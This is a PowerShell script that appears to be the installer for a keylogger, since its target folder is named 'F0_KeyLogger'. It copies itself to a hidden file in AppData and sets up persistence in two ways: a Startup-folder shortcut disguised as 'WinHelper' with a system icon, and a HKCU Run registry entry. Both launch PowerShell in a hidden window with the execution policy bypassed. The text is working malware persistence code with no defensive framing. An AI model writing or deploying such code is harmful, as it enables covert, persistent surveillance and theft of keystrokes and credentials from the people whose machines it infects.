# Set target directory path inside AppData\Local (more conventional for persistence)
$targetDir = "$env:APPDATA\Local\F0_KeyLogger"
$targetPath = Join-Path $targetDir "k.ps1"

# Ensure the directory exists, create it if not
if (-not (Test-Path $targetDir)) {
    New-Item -Path $targetDir -ItemType Directory
}

# Check if the script path is valid and copy the script to the target directory
if ($MyInvocation.MyCommand.Path) {
    # Copy the script to the target location
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $targetPath -Force
    # Make the file hidden
    attrib +h $targetPath
} else {
    Write-Host "The script path could not be resolved."
    exit
}

# Add script to Startup folder via shortcut
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = Join-Path $startupFolder "WinHelper.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-w hidden -NoP -Ep Bypass -File `"$targetPath`""
$shortcut.IconLocation = "shell32.dll, 17"
$shortcut.Save()

# Alternatively, add to Registry for persistence (if you prefer this over a shortcut)
$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regKeyName = "WinHelper"
$regKeyValue = "powershell -w hidden -NoP -Ep Bypass -File `"$targetPath`""

Set-ItemProperty -Path $regKeyPath -Name $regKeyName -Value $regKeyValue

Write-Host "Script setup complete. It will run on startup."
